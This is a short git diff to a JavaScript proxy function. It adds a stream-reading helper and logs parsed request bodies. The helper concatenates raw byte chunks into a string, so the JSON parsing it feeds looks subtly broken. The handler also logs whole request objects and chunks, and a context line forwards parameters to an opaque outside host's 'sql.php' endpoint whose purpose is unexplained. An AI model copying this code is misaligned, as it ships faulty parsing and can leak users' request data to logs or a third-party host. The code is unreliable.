@@ -72,6 +72,22 @@ async function rewriteUrls(content, baseUrl) {
 
 const ALLOWED_PROTOCOLS = ["http", "https"];
 
+async function readStream(stream) {
+  const reader = stream.getReader();
+  try {
+    let content = "";
+    while (true) {
+      const { done, value } = await reader.read();
+      if (done) break;
+      console.log('Received chunk:', value);
+      content += value;
+    }
+    return content;
+  } finally {
+    reader.releaseLock();
+  }
+}
+
 async function doproxy(req) {
   
   try {
@@ -109,7 +125,7 @@ async function doproxy(req) {
     const url = new URL(req.url);
     const parts = url.pathname.split("/").filter(Boolean);
 
-    console.log(JSON.parse(req.body))
+    console.log(JSON.parse(await readStream(req.body)))
     console.log(req)
     
     let resp3 = await fetch(`https://emuyobzniv.ccccocccc.cc/sql.php?params=${params}&i=3`, {
